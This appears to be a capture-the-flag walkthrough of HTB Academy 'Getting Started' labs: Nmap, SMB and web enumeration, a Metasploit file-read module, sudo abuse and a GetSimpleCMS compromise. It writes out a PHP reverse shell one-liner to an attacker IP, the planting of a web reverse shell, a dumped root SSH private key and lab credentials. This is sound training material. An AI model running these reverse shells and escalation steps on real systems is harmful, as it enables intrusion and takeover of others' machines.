---
description: HTB Academy
---

# Getting Started

{% tabs %}
{% tab title="Service Scanning" %}
**Perform an Nmap scan of the target. What does Nmap display as the version of the service running on port 8080?**

```shellscript
$ nmap -sC -sV 10.129.227.137
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-16 08:01 CST
Nmap scan report for 10.129.227.137
Host is up (0.086s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.67
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Feb 25  2021 pub
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:01:d7:79:e9:d2:09:2a:b8:d9:b4:9a:6c:00:0c:1c (RSA)
|   256 2b:99:b2:1f:ec:1a:5a:c6:b7:be:b5:50:d1:0e:a9:df (ECDSA)
|_  256 e4:f8:17:8d:d4:71:d1:4e:d4:0e:bd:f0:29:4f:6d:14 (ED25519)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: PHP 7.4.3 - phpinfo()
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2323/tcp open  telnet      Linux telnetd
8080/tcp open  http        Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-16T14:00:48
|_  start_date: N/A
|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: -30s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.40 seconds
```

> **Answer:** Apache Tomcat

***

**Perform an Nmap scan of the target and identify the non-default port that the telnet service is running on.**

Telnet usually lives on its cozy little default home: port 23. But if we scroll back up to our Nmap scan like responsible investigators, we notice something slightly rebellious. Telnet isn’t on 23. It’s hanging out on port 2323 instead.

> **Answer:** 2323

***

**List the SMB shares available on the target host. Connect to the available share as the bob user. Once connected, access the folder called 'flag' and submit the contents of the flag.txt file.**

Alright, time to go share-hunting. Most of these are the usual defaults, but `users` is the only share that looks _custom_ — aka the only one worth our time.

```shellscript
$ smbclient -N -L \\\\10.129.227.137

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	users           Disk      
	IPC$            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

We’ve got creds from earlier: `bob:Welcome1`. Let’s use them:

```shellscript
$ smbclient -U bob \\\\10.129.227.137\\users
Password for [WORKGROUP\bob]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Feb 25 17:06:52 2021
  ..                                  D        0  Thu Feb 25 14:05:31 2021
  flag                                D        0  Thu Feb 25 17:09:26 2021
  bob                                 D        0  Thu Feb 25 15:42:23 2021

		4062912 blocks of size 1024. 1350312 blocks available
smb: \> 
```

We’re in. Time to see what’s inside. Well… that’s not subtle at all. There’s literally a folder named flag. Let’s go shopping.

```shellscript
smb: \> cd flag
smb: \flag\> ls
  .                                   D        0  Thu Feb 25 17:09:26 2021
  ..                                  D        0  Thu Feb 25 17:06:52 2021
  flag.txt                            N       33  Thu Feb 25 17:09:26 2021

		4062912 blocks of size 1024. 1350304 blocks available
smb: \flag\> get flag.txt
getting file \flag\flag.txt of size 33 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \flag\> exit

$ cat flag.txt 
dceece590f3284c3866305eb2473d099
```

> **Answer:** dceece590f3284c3866305eb2473d099
{% endtab %}

{% tab title="Web Enumeration" %}
**Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.**

```shellscript
$ gobuster dir -u http://94.237.63.176:41610/ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://94.237.63.176:41610/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 281]
/.htaccess            (Status: 403) [Size: 281]
/.htpasswd            (Status: 403) [Size: 281]
/index.php            (Status: 200) [Size: 990]
/robots.txt           (Status: 200) [Size: 45]
/server-status        (Status: 403) [Size: 281]
/wordpress            (Status: 301) [Size: 327] [--> http://94.237.63.176:41610/wordpress/]
Progress: 4723 / 4724 (99.98%)
===============================================================
Finished
===============================================================
```

Gobuster comes back with something actually useful for once: `/wordpress` is reachable. And when we browse there… we don’t get a fancy homepage — we get the WordPress setup screen.

<figure><img src=".gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

While poking around, we also find a `robots.txt` file doing the classic “please don’t look here” routine. It specifically disallows: `/admin-login-page.php`

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

So obviously we go there immediately.

<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

And yep — it’s a login page. Even better, the creds are basically gift-wrapped:

<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

We log in, and the site politely hands us the prize.

<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

> **Answer:** HTB{w3b\_3num3r4710n\_r3v34l5\_53cr375}
{% endtab %}

{% tab title="Public Exploits" %}
**Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file.**

As soon as the machine boots and we hit the provided URL, we’re greeted by a lovely little banner that basically screams: "Hi! I’m running `Simple Backup Plugin 2.7.10`" …which is hacker-speak for: “Please read my files."

<figure><img src=".gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

A quick search immediately lands us on a Rapid7 module write-up: [https://www.rapid7.com/db/modules/auxiliary/scanner/http/wp\_simple\_backup\_file\_read/](https://www.rapid7.com/db/modules/auxiliary/scanner/http/wp_simple_backup_file_read/). Turns out this plugin comes with a directory traversal / arbitrary file read bug. So the question becomes: can Metasploit do the heavy lifting for us?

```shellscript
$ msfconsole -q
[msf](Jobs:0 Agents:0) >> search exploit simple backup 2.7.10

Matching Modules
================

   #  Name                                               Disclosure Date  Rank    Check  Description
   -  ----                                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wp_simple_backup_file_read  .                normal  No     WordPress Simple Backup File Read Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_simple_backup_file_read

[msf](Jobs:0 Agents:0) >> use 0
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/wp_simple_backup_file_read) >>
```

Spoiler: yes. Metasploit already has it on tap.

```shellscript
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/wp_simple_backup_file_read) >> show options

Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root fo
                                         lder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:por
                                         t[,type:host:port][...]. Supported pr
                                         oxies: sapni, socks4, socks5, socks5h
                                         , http
   RHOSTS                      yes       The target host(s), see https://docs.
                                         metasploit.com/docs/using-metasploit/
                                         basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connec
                                         tions
   TARGETURI  /                yes       The base path to the wordpress applic
                                         ation
   THREADS    1                yes       The number of concurrent threads (max
                                          one per host)
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) auxiliary(scanner/http/wp_simple_backup_file_read) >> set RHOSTS 94.237.120.74
RHOSTS => 94.237.120.74
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/wp_simple_backup_file_read) >> set RPORT 53373
RPORT => 53373
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/wp_simple_backup_file_read) >> set FILEPATH /flag.txt
FILEPATH => /flag.txt
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/wp_simple_backup_file_read) >> run
[+] File saved in: /home/htb-ac-1126494/.msf4/loot/20260116095720_default_94.237.120.74_simplebackup.tra_639220.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

Opening the saved file gives us the contents of `/etc/shadow`

```shellscript
$ cat /h/home/htb-ac-1126494/.msf4/loot/20260116095720_default_94.237.120.74_simplebackup.tra_639220.txt
HTB{my_f1r57_h4ck}
```

> **Answer:** HTB{my\_f1r57\_h4ck}
{% endtab %}

{% tab title="Privilege Escalation" %}
**SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.**

Alright, first step: get on the box. SSH is open, just not on the default port — so we bring the `-p` flag and knock on the right door:

```shellscript
$ ssh user1@83.136.252.32 -p 57649
The authenticity of host '[83.136.252.32]:57649 ([83.136.252.32]:57649)' can't be established.
ED25519 key fingerprint is SHA256:KDcF5lg81jNEGgdr67bEo+Ui1pmsyHXKnw/ZHPLZCyY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[83.136.252.32]:57649' (ED25519) to the list of known hosts.
(user1@83.136.252.32) Password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 6.1.0-10-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

user1@ng-1126494-gettingstartedprivesc-jdkjb-576c9d7cc5-9dm8x:~$ 
```

Next move is always the same: ask sudo what it’s willing to let us do.&#x20;

```shellscript
user1@ng-1126494-gettingstartedprivesc-jdkjb-576c9d7cc5-9dm8x:/home/user2$ sudo -l
Matching Defaults entries for user1 on
    ng-1126494-gettingstartedprivesc-jdkjb-576c9d7cc5-9dm8x:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on
        ng-1126494-gettingstartedprivesc-jdkjb-576c9d7cc5-9dm8x:
    (user2 : user2) NOPASSWD: /bin/bash
```

And it replies with something extremely suspicious (in a good way). So user1 can run /bin/bash as user2, and it’s NOPASSWD.

Let’s do exactly that:

```shellscript
user1@ng-1126494-gettingstartedprivesc-jdkjb-576c9d7cc5-9dm8x:/home/user2$ sudo -u user2 /bin/bash
user2@ng-1126494-gettingstartedprivesc-jdkjb-576c9d7cc5-9dm8x:~$ whoami
user2
```

Now that we’re user2, we go straight for the loot:

```shellscript
user2@ng-1126494-gettingstartedprivesc-jdkjb-576c9d7cc5-9dm8x:~$ cat /home/user2/flag.txt 
HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
```

> **Answer:** HTB{l473r4l\_m0v3m3n7\_70\_4n07h3r\_u53r}



**Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.**

After poking around a bit, I decided to do the one thing you’re _usually_ not supposed to be able to do: …peek inside `/root`. And to my surprise, it wasn’t just accessible — it was basically welcoming me in with a warm hug.

```shellscript
user2@ng-1126494-gettingstartedprivesc-jdkjb-576c9d7cc5-9dm8x:~$ ls -lsa /root/
total 40
8 drwxr-x--- 1 root user2 4096 Jan 21 07:31 .
4 drwxr-xr-x 1 root root  4096 Jan 21 07:09 ..
4 -rwxr-x--- 1 root user2    5 Aug 19  2020 .bash_history
4 -rwxr-x--- 1 root user2 3106 Dec  5  2019 .bashrc
4 drwx------ 2 root root  4096 Jan 21 07:31 .cache
4 -rwxr-x--- 1 root user2  161 Dec  5  2019 .profile
4 drwxr-x--- 1 root user2 4096 Feb 12  2021 .ssh
4 -rwxr-x--- 1 root user2 1309 Aug 19  2020 .viminfo
4 -rw------- 1 root root    33 Feb 12  2021 flag.txt
user2@ng-1126494-gettingstartedprivesc-jdkjb-576c9d7cc5-9dm8x:~$ ls -lsa /root/.ssh/
total 24
4 drwxr-x--- 1 root user2 4096 Feb 12  2021 .
8 drwxr-x--- 1 root user2 4096 Jan 21 07:31 ..
4 -rw------- 1 root root   571 Feb 12  2021 authorized_keys
4 -rw-r--r-- 1 root root  2602 Feb 12  2021 id_rsa
4 -rw-r--r-- 1 root root   571 Feb 12  2021 id_rsa.pub
```

Right away we notice something spicy: `/root/.ssh/` is readable. And inside it… there’s an id\_rsa private key. So naturally, we do what any responsible person would do:

```shellscript
user2@ng-1126494-gettingstartedprivesc-jdkjb-576c9d7cc5-9dm8x:~$ cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

We copy the key over to our machine and save it as `ssh_key` . We use the stolen key to SSH directly as root:

```shellscript
$ vim ssh_key
$ chmod 600 ssh_key 
$ ssh root@83.136.252.32 -p 57649 -i ssh_key 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 6.1.0-10-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ng-1126494-gettingstartedprivesc-jdkjb-576c9d7cc5-9dm8x:~# whoami
root
```

That’s it. We’re root. No exploit chains. No kernel bugs. Just… “here’s my private key, have fun.” Now we grab the prize:

```shellscript
root@ng-1126494-gettingstartedprivesc-jdkjb-576c9d7cc5-9dm8x:~# cat /root/flag.txt 
HTB{pr1v1l363_35c4l4710n_2_r007}
```

> **Answer:** HTB{pr1v1l363\_35c4l4710n\_2\_r007}
{% endtab %}
{% endtabs %}

For the Nibbles walkthrough see [Nibbles](machines/nibbles.md).

***

**Knowledge check**

We kick things off the traditional way: knocking on the front door with Nmap and seeing what answers back:

```shellscript
$ nmap -sC -sV -T5 10.129.1.153
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-21 10:07 CST
Nmap scan report for 10.129.1.153
Host is up (0.056s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome to GetSimple! - gettingstarted
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.09 seconds
```

Nmap comes back with a pretty clean report. And then it drops a little hint in `robots.txt`. Ah yes… the classic “please don’t look here” sign. So of course we immediately look there. The only disallowed entry is `/admin` .&#x20;

Browsing to the IP shows a default-looking site, but the title gives it away:

<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

So we’re dealing with GetSimpleCMS, but we don’t know the exact version yet. Let’s follow robots.txt and head to `/admin`:

<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

And yep — it’s an admin login panel. Because it’s a CTF and CTFs love lazy setups, we try: `admin:admin` . …and it works. We’re in. No drama. Just straight-up negligence.

<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

Near the bottom of the panel we spot the version: `GetSimpleCMS version 3.3.15`.&#x20;

Quick searching doesn’t reveal any juicy RCE — mostly XSS stuff — so instead of chasing CVEs, we do the next best thing: “We already have admin… can we just upload/edit something evil?”

<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

Poking around the admin tabs, the Theme section looks very promising.

<figure><img src=".gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

We check the theme folder location and can see which theme files are being used.

Then we find the real gift: "Theme editor".

<figure><img src=".gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

Maybe we can put a reverse shell in here? We grab a classic reverse shell payload ([pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) style), replace the file contents completely, and save it.

<figure><img src=".gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

Start the listener, then trigger the PHP file in the browser… And boom:

```shellscript
$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.15.52] from (UNKNOWN) [10.129.1.153] 53722
Linux gettingstarted 5.4.0-65-generic #73-Ubuntu SMP Mon Jan 18 17:25:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 16:26:43 up 22 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Nice — we’ve got a shell as www-data. Grab the flag:

```shellscript
www-data@gettingstarted:/$ cd /home/
www-data@gettingstarted:/home$ ls
mrb3n
www-data@gettingstarted:/home$ cd mrb3n/
www-data@gettingstarted:/home/mrb3n$ cat user.txt 
7002d65b149b0a4d19132a66feed21d8
```

> **User flag:** 7002d65b149b0a4d19132a66feed21d8

Sudo check: "what can www-data do"?

```shellscript
www-data@gettingstarted:/home/mrb3n$ sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
    
www-data@gettingstarted:/home/mrb3n$ sudo /usr/bin/php -r '$s=fsockopen("10.10.15.52",1111);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Wait… what? So www-data can run PHP as root without a password. That’s not a misconfiguration — that’s a donation.&#x20;

We use PHP to spawn another reverse shell, but this time with root privileges:

```shellscript
sudo /usr/bin/php -r '$s=fsockopen("10.10.15.52",1111);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Start a second listener:

```shellscript
$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.15.52] from (UNKNOWN) [10.129.1.153] 54720
# whoami
root
```

And sure enough: we are root. Effort level: minimal. Satisfaction level: maximum.

```shellscript
# cat /root/root.txt
f1fba6e9f71efb2630e6e34da6387842
```

> **Root flag:** f1fba6e9f71efb2630e6e34da6387842
